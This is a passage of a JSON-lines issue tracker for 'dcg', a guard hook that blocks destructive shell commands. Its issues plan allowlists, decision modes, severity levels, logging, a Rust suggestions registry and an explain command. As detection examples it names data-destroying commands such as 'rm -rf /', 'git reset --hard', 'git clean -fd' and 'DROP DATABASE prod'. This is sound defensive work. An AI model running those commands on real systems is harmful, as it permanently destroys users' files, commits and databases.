source.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:05:38.822435052-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:05:38.822435052-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.2.5","depends_on_id":"git_safety_guard-1gt.2","type":"parent-child","created_at":"2026-01-07T21:05:46.8623866-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.2.5","depends_on_id":"git_safety_guard-1gt.2.2","type":"blocks","created_at":"2026-01-07T21:22:11.842613996-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.2.5","depends_on_id":"git_safety_guard-1gt.2.3","type":"blocks","created_at":"2026-01-07T21:22:16.936078434-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.2.5","depends_on_id":"git_safety_guard-1gt.2.4","type":"blocks","created_at":"2026-01-07T21:22:22.029722971-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.2.6","title":"Allowlist: E2E coverage in scripts/e2e_test.sh (hook path)","description":"## Objective\n\nAdd end-to-end coverage proving allowlists affect the **real hook path** (stdin JSON → decision) and do not create accidental broad bypasses.\n\n## Why E2E is required\n\nAllowlisting is a high-risk feature:\n\n- It must override only the intended rule.\n- It must work in hook mode (not just `dcg test`).\n- It must not silently disable packs or normalization.\n\n## Test cases (must include)\n\n1) Baseline: a known catastrophic command is blocked\n- e.g., `git reset --hard` (record the rule_id used)\n\n2) Project allowlist overrides that exact rule\n- Create `.dcg/allowlist.toml` in an isolated fixture repo/cwd.\n- Re-run the same hook JSON input.\n- Expected: ALLOW (or WARN if configured) with **no JSON deny**.\n\n3) Non-target rule remains enforced\n- Ensure another blocked command is still blocked (e.g., `git clean -fd`).\n\n4) Expired allowlist entry does not apply\n\n5) Unsafe wildcard entry is rejected (or requires risk_ack)\n\n## Logging requirements\n\nE2E output should print:\n\n- the rule_id being allowlisted\n- which allowlist layer was used (project vs user)\n- expected vs actual decision\n\n## Acceptance criteria\n\n- E2E fails if allowlist does not apply in hook mode.\n- E2E fails if allowlist is broader than intended.\n\n## Dependencies\n\n- `git_safety_guard-1gt.2.2` evaluator integration\n- `git_safety_guard-1gt.2.3` allowlist CLI (optional; direct file edit acceptable in test)\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T22:23:47.275624855-05:00","created_by":"ubuntu","updated_at":"2026-01-07T22:23:47.275624855-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.2.6","depends_on_id":"git_safety_guard-1gt.2","type":"parent-child","created_at":"2026-01-07T22:23:58.619659792-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.2.6","depends_on_id":"git_safety_guard-1gt.2.2","type":"blocks","created_at":"2026-01-07T22:24:03.663391147-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.2.6","depends_on_id":"git_safety_guard-1gt.2.3","type":"blocks","created_at":"2026-01-07T22:24:08.707714436-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.3","title":"Add decision modes: block vs warn vs log-only","description":"## Objective\n\nReduce disruption by allowing less-confident detections to warn or log instead of hard-blocking, while keeping high-confidence matches as hard blocks.\n\n## Background\n\nSome detections are extremely high confidence (e.g., `rm -rf /`, `git reset --hard`). Others are context-dependent or susceptible to false positives.\n\nA single binary mode (always deny) can be overly disruptive, especially when expanding into heredoc scanning and AST-based heuristics.\n\n## Proposed behavior\n\nAdd a policy layer that can choose between:\n\n- **deny** (current behavior): block command\n- **warn**: print warning to stderr and/or log, but allow command (no JSON deny)\n- **log-only**: silent allow, but log event for later review\n\nPolicy should be configurable:\n\n- global default (e.g., deny)\n- per-pack override\n- per-pattern override\n\n## Safety constraints\n\n- Default should remain deny for known-catastrophic patterns.\n- Warn/log-only must never apply to the most dangerous patterns unless the user explicitly configures it.\n\n## Acceptance criteria\n\n- Config supports selecting mode per pack/pattern.\n- Output is correct per mode:\n  - deny: stderr warning + stdout JSON deny\n  - warn: stderr warning, no stdout\n  - log-only: optional log entry, no stderr/stdout\n- Tests cover all three modes.\n","status":"open","priority":2,"issue_type":"feature","created_at":"2026-01-07T20:05:08.791980925-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:05:08.791980925-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.3","depends_on_id":"git_safety_guard-1gt","type":"parent-child","created_at":"2026-01-07T20:05:08.793291122-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.3","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T20:06:02.265838837-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.3.1","title":"Decision policy: define rule severity taxonomy + default modes","description":"## Objective\n\nDefine an explicit, documented severity taxonomy for rules, and map severity → default decision mode.\n\nThis prevents ad-hoc \"some things warn, some deny\" drift and supports:\n\n- predictable rollout (warn-first where appropriate)\n- stable CI policy (`--fail-on error|warning` for scan)\n- consistent UX between hook, explain, and scan\n\n## Proposed taxonomy (v1)\n\n- `error` (catastrophic / irreversible): default **DENY**\n  - examples: `rm -rf /`, `git reset --hard`, `git clean -fd`, `DROP DATABASE prod`\n\n- `warning` (dangerous but sometimes intentional): default **WARN** (or DENY in strict packs)\n  - examples: `git push --force` (could be warn if confidence low)\n\n- `info` (advisory): default **LOG-ONLY**\n\n## Rules of the road\n\n- Severity is a property of a rule (pack_id + pattern_name), not of user configuration.\n- User configuration can *tighten* (warn→deny) freely.\n- User configuration can *loosen* (deny→warn/log) only with explicit acknowledgement (see allowlist safety rules).\n\n## Acceptance criteria\n\n- `Severity` enum exists and is used consistently across:\n  - hook deny/warn/log output\n  - `dcg explain`\n  - `dcg scan` JSON output\n- Default mapping is documented and test-covered.\n\n## Dependencies\n\n- `git_safety_guard-1gt.3` (decision modes implementation)\n- `git_safety_guard-99e.2` (stable rule IDs)\n","status":"closed","priority":2,"issue_type":"task","created_at":"2026-01-07T22:01:58.171989907-05:00","created_by":"ubuntu","updated_at":"2026-01-08T01:50:42.026890924-05:00","closed_at":"2026-01-08T01:50:42.026890924-05:00","close_reason":"Implemented Severity and DecisionMode enums with Critical/High/Medium/Low levels. Updated DestructivePattern, DestructiveMatch, CheckResult structs. Added 10 comprehensive tests. All 92 tests pass.","dependencies":[{"issue_id":"git_safety_guard-1gt.3.1","depends_on_id":"git_safety_guard-1gt.3","type":"parent-child","created_at":"2026-01-07T22:02:07.49512402-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.3.1","depends_on_id":"git_safety_guard-99e.2","type":"blocks","created_at":"2026-01-07T22:02:19.24160358-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.3.2","title":"Decision policy: tag existing rules with severity + regression tests","description":"## Objective\n\nApply the severity taxonomy from `git_safety_guard-1gt.3.1` to existing packs and ensure outputs stay stable.\n\n## Scope\n\n- Core packs (`core.git`, `core.filesystem`) first.\n- High-signal packs next (docker/k8s/db) as they become reachable in hook mode.\n\n## Requirements\n\n- Each destructive rule has an explicit severity.\n- Scan output includes severity for each finding.\n- Deny/warn/log mode defaults respect severity mapping.\n\n## Tests\n\n- Snapshot tests for:\n  - deny output includes severity\n  - explain JSON includes severity\n  - scan JSON includes severity\n- Regression tests for key rules:\n  - `core.git:reset-hard` remains `error`\n  - `core.filesystem:rm-rf-non-temp` remains `error`\n\n## Dependencies\n\n- `git_safety_guard-1gt.3.1` (taxonomy)\n- `git_safety_guard-99e.2.2` (pattern metadata propagation)\n\n## Acceptance Criteria\n\n- Every rule in core packs has an explicit severity tag.\n- Hook output includes severity (or decision mode derived from severity) in a stable, test-covered way.\n- `dcg explain` shows severity per match and per final decision.\n- `dcg scan --json` emits severity per finding and honors `--fail-on error|warning`.\n- Regression tests prevent accidental severity drift for a curated set of high-impact rules.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T22:02:32.98122712-05:00","created_by":"ubuntu","updated_at":"2026-01-07T22:54:55.338818949-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.3.2","depends_on_id":"git_safety_guard-1gt.3","type":"parent-child","created_at":"2026-01-07T22:02:42.227156139-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.3.2","depends_on_id":"git_safety_guard-1gt.3.1","type":"blocks","created_at":"2026-01-07T22:02:54.842192671-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.3.2","depends_on_id":"git_safety_guard-99e.2.2","type":"blocks","created_at":"2026-01-07T22:02:59.882469179-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.3.3","title":"Observe mode: warn-first rollout config + expiration","description":"## Objective\n\nMake it easy to roll out DCG in a non-velocity-destroying way by supporting an explicit **observe / warn-first** mode with an optional expiration.\n\nThis is a policy/ops feature: it does not change matching, only what DCG *does* when it detects something.\n\n## Requirements\n\n- Config supports a global rollout mode, e.g.:\n  - `policy.default_mode = \"warn\"` (or `log-only`)\n  - optional `policy.observe_until = \"2026-02-01T00:00:00Z\"`\n\n- Semantics:\n  - Before `observe_until`: default to WARN for non-catastrophic rules (severity-driven).\n  - After `observe_until`: revert to normal defaults (deny for `error`), or emit a clear warning that the observe window expired.\n\n- Safety constraints:\n  - Catastrophic rules (severity `error`) should remain DENY unless user explicitly loosens them with an acknowledgement mechanism.\n\n## Acceptance criteria\n\n- Users can enable warn-first rollout without editing per-pack/per-rule settings.\n- Behavior is deterministic and test-covered.\n\n## Tests\n\n- Unit tests for:\n  - observe window active\n  - observe window expired\n  - catastrophic rule remains DENY in observe mode\n\n## Dependencies\n\n- `git_safety_guard-1gt.3.1` severity taxonomy\n- `git_safety_guard-1gt.3` decision modes infrastructure\n","status":"open","priority":3,"issue_type":"task","created_at":"2026-01-07T22:17:33.532547162-05:00","created_by":"ubuntu","updated_at":"2026-01-07T22:17:33.532547162-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.3.3","depends_on_id":"git_safety_guard-1gt.3","type":"parent-child","created_at":"2026-01-07T22:17:42.627513231-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.3.3","depends_on_id":"git_safety_guard-1gt.3.1","type":"blocks","created_at":"2026-01-07T22:17:47.669891197-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.3.4","title":"Decision modes: E2E coverage (deny vs warn vs log-only behavior)","description":"## Objective\n\nAdd end-to-end tests proving decision modes behave correctly in the hook protocol.\n\n## Why\n\nDecision mode bugs are extremely user-visible:\n\n- WARN must allow (no stdout JSON deny) but still provide stderr output.\n- LOG-ONLY must be silent (no stdout, no stderr) but may emit structured logs.\n\n## Test cases\n\n- Configure a non-catastrophic rule to WARN and verify:\n  - exit allows\n  - stderr contains a warning\n  - stdout is empty\n\n- Configure a rule to LOG-ONLY and verify:\n  - stdout empty\n  - stderr empty\n\n- Verify catastrophic rules remain DENY by default.\n\n## Logging requirements\n\n- Print captured stdout/stderr on failure (truncated).\n- Print which config/policy settings were active.\n\n## Acceptance criteria\n\n- Tests would catch accidental protocol regressions (e.g., WARN emitting JSON deny).\n\n## Dependencies\n\n- `git_safety_guard-1gt.3` decision modes implementation\n- `git_safety_guard-99e.3.1` shared evaluator\n","status":"open","priority":3,"issue_type":"task","created_at":"2026-01-07T22:24:26.009028742-05:00","created_by":"ubuntu","updated_at":"2026-01-07T22:24:26.009028742-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.3.4","depends_on_id":"git_safety_guard-1gt.3","type":"parent-child","created_at":"2026-01-07T22:24:36.855424505-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.3.4","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T22:24:54.034020082-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.4","title":"Structured logging for allow/deny decisions (optional redaction)","description":"## Objective\n\nImprove operational visibility without compromising privacy by offering structured logs for decisions.\n\n## Background\n\n`dcg` already supports a simple log file for blocked commands. As we add more sophisticated analysis (execution context, heredocs, AST), we need logs that can support:\n\n- diagnosing false positives\n- tuning config\n- measuring performance impact\n\n## Proposed logging fields\n\nAt minimum (on deny/warn/log-only events):\n\n- timestamp\n- mode (deny/warn/log-only)\n- raw command (optionally redacted)\n- normalized command\n- pack_id\n- pattern_name\n- reason\n- execution context summary (if available)\n- elapsed time (optional)\n\n## Redaction strategy\n\n- Provide a config option to redact arguments beyond a threshold or redact quoted strings.\n- Default behavior should be conservative (log only for deny events).\n\n## Acceptance criteria\n\n- Logs are well-formed and append-only.\n- A `--json` log format exists (optional).\n- Unit tests verify logging output format.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:05:23.438761061-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:05:23.438761061-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.4","depends_on_id":"git_safety_guard-1gt","type":"parent-child","created_at":"2026-01-07T20:05:23.440080967-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.4","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T20:06:07.298637722-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.4","depends_on_id":"git_safety_guard-tlog","type":"relates-to","created_at":"2026-01-07T20:11:15.440752673-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.5","title":"Suggestions DB: safe alternatives + how-to-allow guidance","description":"## Objective\n\nMake `dcg` helpful, not just restrictive, by attaching curated suggestions to blocked rules.\n\nWhen a command is blocked (or warned), the user should immediately see:\n\n- what happened (stable rule id)\n- why it's risky\n- safe alternatives / preview steps\n- how to allow safely (rule-id allowlist command)\n\n## Key idea\n\nMaintain a small, explicit \"suggestions database\" keyed by stable rule id:\n\n- `rule_id = \"pack_id:pattern_name\"`\n\nEach rule can have 0..N suggestions:\n\n- `preview_first` (e.g., `git clean -n`, `docker system df`)\n- `safer_alternative` (e.g., `--force-with-lease`)\n- `workflow_fix` (e.g., `git stash` first)\n- `allow_safely` (copy/paste allowlist command)\n- `docs` (README anchor)\n\n## Why this is worth doing\n\n- Reduces \"rage disable\" moments.\n- Teaches users safer habits.\n- Makes false positives much cheaper to resolve.\n\n## Constraints\n\n- Suggestions must be non-prescriptive when environment-specific.\n- Suggestions must be safe-by-default (no destructive commands suggested).\n- Hook output must remain bounded in size.\n\n## Acceptance criteria\n\n- For core rules, deny output includes at least one actionable suggestion.\n- Explain mode includes suggestions in all formats.\n- Suggestions are deterministic and test-covered.\n","status":"open","priority":2,"issue_type":"feature","created_at":"2026-01-07T21:06:08.978286566-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:06:08.978286566-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.5","depends_on_id":"git_safety_guard-1gt","type":"parent-child","created_at":"2026-01-07T21:06:18.675450948-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.5.1","title":"Suggestions: data model + registry keyed by rule id","description":"## Objective\n\nDefine the suggestion data model and implement a registry lookup by stable rule id.\n\n## Background\n\nWhen DCG blocks a command, users need actionable guidance:\n- What safer alternatives exist?\n- How can they preview the effect first?\n- How can they allowlist if intentional?\n\nA well-designed suggestion system improves UX and reduces frustration.\n\n## SuggestionKind Enum\n\n```rust\n/// Type of suggestion to help the user\n#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]\n#[serde(rename_all = \"snake_case\")]\npub enum SuggestionKind {\n    /// \"Run this first to preview the effect\"\n    /// e.g., \"Run `git diff` before `git reset --hard`\"\n    PreviewFirst,\n\n    /// \"Use this safer alternative instead\"\n    /// e.g., \"Use `git reset --soft` or `--mixed` instead of `--hard`\"\n    SaferAlternative,\n\n    /// \"Fix your workflow to avoid this situation\"\n    /// e.g., \"Commit your changes before resetting\"\n    WorkflowFix,\n\n    /// \"Read the documentation for more context\"\n    /// e.g., \"See: https://git-scm.com/docs/git-reset\"\n    Documentation,\n\n    /// \"How to allowlist this specific rule\"\n    /// e.g., \"To allow: `dcg allow core.git:reset-hard --reason '...'`\"\n    AllowSafely,\n}\n```\n\n## Suggestion Struct\n\n```rust\n#[derive(Debug, Clone, Serialize, Deserialize)]\npub struct Suggestion {\n    /// Type of suggestion\n    pub kind: SuggestionKind,\n\n    /// Human-readable suggestion text\n    pub text: String,\n\n    /// Optional command the user can copy/paste\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub command: Option\u003cString\u003e,\n\n    /// Optional URL for documentation\n    #[serde(skip_serializing_if = \"Option::is_none\")]\n    pub url: Option\u003cString\u003e,\n}\n```\n\n## Registry Implementation\n\n```rust\nuse std::sync::LazyLock;\nuse std::collections::HashMap;\n\n/// Registry of suggestions keyed by rule_id (e.g., \"core.git:reset-hard\")\nstatic SUGGESTION_REGISTRY: LazyLock\u003cHashMap\u003c\u0026'static str, Vec\u003cSuggestion\u003e\u003e\u003e =\n    LazyLock::new(|| {\n        let mut m = HashMap::new();\n\n        m.insert(\"core.git:reset-hard\", vec![\n            Suggestion {\n                kind: SuggestionKind::PreviewFirst,\n                text: \"Run `git diff` and `git status` to see what would be lost\".into(),\n                command: Some(\"git diff \u0026\u0026 git status\".into()),\n                url: None,\n            },\n            Suggestion {\n                kind: SuggestionKind::SaferAlternative,\n                text: \"Use `git reset --soft` or `--mixed` to preserve changes\".into(),\n                command: Some(\"git reset --soft HEAD~1\".into()),\n                url: None,\n            },\n            Suggestion {\n                kind: SuggestionKind::WorkflowFix,\n                text: \"Consider using `git stash` to save changes temporarily\".into(),\n                command: Some(\"git stash\".into()),\n                url: None,\n            },\n        ]);\n\n        // ... more rules\n        m\n    });\n\n/// Look up suggestions for a rule\npub fn get_suggestions(rule_id: \u0026str) -\u003e Option\u003c\u0026'static [Suggestion]\u003e {\n    SUGGESTION_REGISTRY.get(rule_id).map(|v| v.as_slice())\n}\n```\n\n## Output Formatting\n\n### Hook Deny Output (stderr)\nShow only top 1-3 suggestions to keep output bounded:\n\n```\n╔══════════════════════════════════════════════════════════════╗\n║  ⚠️  BLOCKED: git reset --hard HEAD~5                        ║\n╠══════════════════════════════════════════════════════════════╣\n║  Rule: core.git:reset-hard                                   ║\n║  Reason: Hard reset can permanently lose uncommitted changes ║\n╠══════════════════════════════════════════════════════════════╣\n║  💡 Try instead:                                             ║\n║  • Run `git diff` first to see what would be lost            ║\n║  • Use `git reset --soft` to preserve changes                ║\n╚══════════════════════════════════════════════════════════════╝\n```\n\n### Explain Mode (JSON)\nInclude all suggestions in structured format:\n\n```json\n{\n  \"decision\": \"deny\",\n  \"rule_id\": \"core.git:reset-hard\",\n  \"reason\": \"Hard reset can permanently lose uncommitted changes\",\n  \"suggestions\": [\n    {\n      \"kind\": \"preview_first\",\n      \"text\": \"Run `git diff` and `git status` to see what would be lost\",\n      \"command\": \"git diff \u0026\u0026 git status\"\n    },\n    {\n      \"kind\": \"safer_alternative\",\n      \"text\": \"Use `git reset --soft` or `--mixed` to preserve changes\",\n      \"command\": \"git reset --soft HEAD~1\"\n    }\n  ]\n}\n```\n\n## Requirements\n\n- Registry lookup is O(1) via HashMap\n- Zero allocations on lookup (return static references)\n- Suggestions are stable and deterministic (iteration order preserved)\n- JSON output uses snake_case for kind values\n\n## Acceptance Criteria\n\n- Registry lookup is fast and allocation-light.\n- JSON output for explain includes suggestions in a stable order.\n- All SuggestionKind variants are used appropriately across rules.\n\n## Tests\n\n- Unit tests for registry lookup and ordering.\n- Snapshot tests for JSON output format.\n- Coverage test: assert all core pack rules have at least one suggestion.","status":"closed","priority":2,"issue_type":"task","created_at":"2026-01-07T21:06:31.606222639-05:00","created_by":"ubuntu","updated_at":"2026-01-08T10:31:43.691276501-05:00","closed_at":"2026-01-08T10:31:43.691276501-05:00","close_reason":"Implemented SuggestionKind enum, Suggestion struct, SUGGESTION_REGISTRY, get_suggestions(), 11 unit tests. Core git/filesystem rules populated.","dependencies":[{"issue_id":"git_safety_guard-1gt.5.1","depends_on_id":"git_safety_guard-1gt.5","type":"parent-child","created_at":"2026-01-07T21:07:01.11809851-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.5.1","depends_on_id":"git_safety_guard-99e.2","type":"blocks","created_at":"2026-01-07T21:22:31.439334729-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.5.2","title":"Suggestions: populate core.git + core.filesystem","description":"## Objective\n\nPopulate suggestions for the highest-traffic and highest-impact rules:\n\n- `core.git:*`\n- `core.filesystem:*`\n\n## What to include\n\nFor each rule:\n\n- a short \"preview first\" command when applicable\n- a safer alternative when one exists\n- the recommended allowlist command (rule-id based)\n\nExamples (conceptual):\n\n- `core.git:reset-hard`:\n  - suggest `git stash` / `git diff` / `git reset --soft|--mixed`\n- `core.git:push-force-*`:\n  - suggest `--force-with-lease`\n- `core.filesystem:rm-rf-*`:\n  - suggest verifying path and using safer deletion flows when possible\n\n## Acceptance criteria\n\n- Every core rule has at least one suggestion.\n- Suggestions are accurate and generic (no environment assumptions).\n\n## Tests\n\n- A \"coverage\" test that asserts all core destructive patterns have at least 1 suggestion.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:06:36.697958943-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:06:36.697958943-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.5.2","depends_on_id":"git_safety_guard-1gt.5","type":"parent-child","created_at":"2026-01-07T21:07:06.209112022-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.5.2","depends_on_id":"git_safety_guard-1gt.5.1","type":"blocks","created_at":"2026-01-07T21:22:36.533341338-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.5.3","title":"Suggestions: populate high-signal non-core packs (docker/k8s/db)","description":"## Objective\n\nPopulate suggestions for the packs most likely to appear in real dev workflows:\n\n- Docker\n- kubectl\n- databases (psql/mysql/redis)\n\n## Guidance\n\nPrefer \"preview\" suggestions:\n\n- docker: `docker system df` before `docker system prune`\n- kubectl: `--dry-run=client` / `kubectl diff`\n- SQL: backup / transaction guidance (keep generic)\n\n## Acceptance criteria\n\n- High-signal destructive patterns in these packs have suggestions.\n- Suggestions are concise and safe.\n","notes":"## Review Additions (2026-01-08)\n\n### Tests\n- Coverage belongs in `git_safety_guard-1gt.5.5`:\n  - deny output includes suggestion(s) for top rules in docker/k8s/db packs\n  - suggestions are keyed by stable rule ID and remain deterministic","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:06:41.789029161-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:26:02.688030654-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.5.3","depends_on_id":"git_safety_guard-1gt.5","type":"parent-child","created_at":"2026-01-07T21:07:11.302023318-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.5.3","depends_on_id":"git_safety_guard-1gt.5.1","type":"blocks","created_at":"2026-01-07T21:22:41.631324095-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.5.4","title":"Integrate suggestions into deny output and explain mode","description":"## Objective\n\nMake suggestions visible where they matter:\n\n- hook deny output (stderr) includes the top suggestion(s)\n- `dcg explain` includes all suggestions (pretty/json/compact)\n\nThis task is also where we implement the **guided learning workflow** (hook-safe, non-interactive):\n\n- on block, print copy/pasteable next steps (`dcg explain ...`, `dcg allowlist add ...`)\n- no prompts; the hook must never wait for user input\n\n## Requirements\n\n### Hook deny output\n\n- Must remain bounded; show only top 1–3 suggestions.\n- Must include:\n  - stable rule id (`pack_id:pattern_name`)\n  - a short reason\n  - at least one safe alternative suggestion (when available)\n  - a copy/paste allowlist command example, e.g.:\n    - `dcg allowlist add \u003crule_id\u003e --reason \"...\" --project`\n  - a copy/paste explain command:\n    - `dcg explain \"\u003ccommand\u003e\"`\n\n### Explain output\n\n- Show all suggestions.\n- JSON includes suggestions as structured objects.\n\n## Acceptance criteria\n\n- Deny output shows stable rule id + at least one suggestion.\n- Deny output includes copy/paste learning commands (explain + allowlist add).\n- Explain mode shows suggestions in all formats.\n\n## Tests\n\n- Snapshot tests for deny output (stderr) for a few core rules.\n- Explain output tests include suggestions list.\n- Regression test: deny output stays under a size cap even if a rule has many suggestions.\n","notes":"## Review Additions (2026-01-08)\n\n### Determinism\n- Suggestion ordering must be deterministic:\n  - sort by severity then stable rule ID\n  - cap list with a stable tie-breaker\n- Output formatting must not depend on hash iteration order.","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:06:46.881705224-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:26:16.266936339-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.5.4","depends_on_id":"git_safety_guard-1gt.5","type":"parent-child","created_at":"2026-01-07T21:07:16.392198141-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.5.4","depends_on_id":"git_safety_guard-1gt.5.1","type":"blocks","created_at":"2026-01-07T21:22:46.724344957-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.5.4","depends_on_id":"git_safety_guard-1gt.1.2","type":"blocks","created_at":"2026-01-07T21:22:51.819635023-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.5.4","depends_on_id":"git_safety_guard-1gt.1.3","type":"blocks","created_at":"2026-01-07T21:22:56.914257712-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.5.4","depends_on_id":"git_safety_guard-1gt.2.3","type":"blocks","created_at":"2026-01-07T21:23:02.00798218-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.5.5","title":"Suggestions: correctness and coverage tests","description":"## Objective\n\nPrevent suggestion drift and ensure suggestions remain helpful.\n\n## Tests\n\n- Coverage:\n  - assert that all patterns with `pattern_name` in core packs have at least one suggestion\n- Correctness (spot checks):\n  - ensure suggestions never include explicitly forbidden destructive commands (e.g., do not suggest `rm -rf`)\n- Ordering:\n  - stable output ordering across runs\n\n## Acceptance criteria\n\n- Suggestions are maintained as a first-class UX surface and do not regress silently.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T21:06:51.975279869-05:00","created_by":"ubuntu","updated_at":"2026-01-07T21:06:51.975279869-05:00","dependencies":[{"issue_id":"git_safety_guard-1gt.5.5","depends_on_id":"git_safety_guard-1gt.5","type":"parent-child","created_at":"2026-01-07T21:07:21.481797439-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.5.5","depends_on_id":"git_safety_guard-1gt.5.1","type":"blocks","created_at":"2026-01-07T21:23:07.101892778-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-1gt.5.5","depends_on_id":"git_safety_guard-1gt.5.2","type":"blocks","created_at":"2026-01-07T21:23:12.196115784-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-1gt.6","title":"Implement dcg explain CLI subcommand","description":"## Objective\n\nImplement the `dcg explain \u003ccommand\u003e` CLI subcommand that provides a full decision trace for any command.\n\n## Background\n\nWhen DCG blocks (or allows) a command, users and developers need to understand WHY:\n- Which patterns matched?\n- Which packs were evaluated?\n- Was it blocked by a destructive pattern or allowed by a safe pattern?\n- What context classification was applied?\n\nThe explain mode provides complete transparency into DCG's decision-making process.\n\n## CLI Interface\n\n```bash\n# Basic usage\ndcg explain \"git reset --hard HEAD~5\"\n\n# Output format options\ndcg explain \"command\" --format pretty   # Human-readable (default)\ndcg explain \"command\" --format json     # Machine-readable\ndcg explain \"command\" --format compact  # Single-line summary\n\n# Verbose mode (include all evaluated packs, not just matching)\ndcg explain \"command\" --verbose\n```\n\n## Decision Trace Structure\n\nThe explain output should show the complete decision pipeline:\n\n```\n╔══════════════════════════════════════════════════════════════════╗\n║  DCG Decision Trace                                              ║\n╠══════════════════════════════════════════════════════════════════╣\n║  Input: git reset --hard HEAD~5                                  ║\n╠══════════════════════════════════════════════════════════════════╣\n║  1. Parse                                                        ║\n║     └─ Tool: Bash                                                ║\n║     └─ Command: git reset --hard HEAD~5                          ║\n╠──────────────────────────────────────────────────────────────────╣\n║  2. Quick Reject                                                 ║\n║     └─ Keywords found: git                                       ║\n║     └─ Result: CONTINUE (keywords present)                       ║\n╠──────────────────────────────────────────────────────────────────╣\n║  3. Normalization                                                ║\n║     └─ Original: git reset --hard HEAD~5                         ║\n║     └─ Normalized: git reset --hard HEAD~5                       ║\n╠──────────────────────────────────────────────────────────────────╣\n║  4. Context Classification                                       ║\n║     └─ Span[0..25]: Executed                                     ║\n║     └─ No safe-string-arg context detected                       ║\n╠──────────────────────────────────────────────────────────────────╣\n║  5. Heredoc Detection                                            ║\n║     └─ Tier 1 trigger: NO                                        ║\n║     └─ Result: SKIP heredoc analysis                             ║\n╠──────────────────────────────────────────────────────────────────╣\n║  6. Pack Evaluation                                              ║\n║     └─ Enabled packs: core.git, core.filesystem                  ║\n║     └─ Pack: core.git                                            ║\n║        ├─ Safe pattern check: NO MATCH                           ║\n║        └─ Destructive pattern check:                             ║\n║           └─ MATCH: reset-hard                                   ║\n║              Pattern: git reset --hard                           ║\n║              Reason: Hard reset can permanently lose commits     ║\n╠──────────────────────────────────────────────────────────────────╣\n║  7. Decision                                                     ║\n║     └─ Result: DENY                                              ║\n║     └─ Rule ID: core.git:reset-hard                              ║\n║     └─ Reason: Hard reset can permanently lose commits           ║\n╠──────────────────────────────────────────────────────────────────╣\n║  8. Suggestions                                                  ║\n║     └─ Run `git diff` first to see what would be lost            ║\n║     └─ Use `git reset --soft` to preserve changes                ║\n║     └─ To allow: dcg allow core.git:reset-hard --reason \"...\"    ║\n╚══════════════════════════════════════════════════════════════════╝\n```\n\n## JSON Output Format\n\n```json\n{\n  \"input\": {\n    \"raw\": \"git reset --hard HEAD~5\",\n    \"tool\": \"Bash\"\n  },\n  \"trace\": {\n    \"quick_reject\": {\n      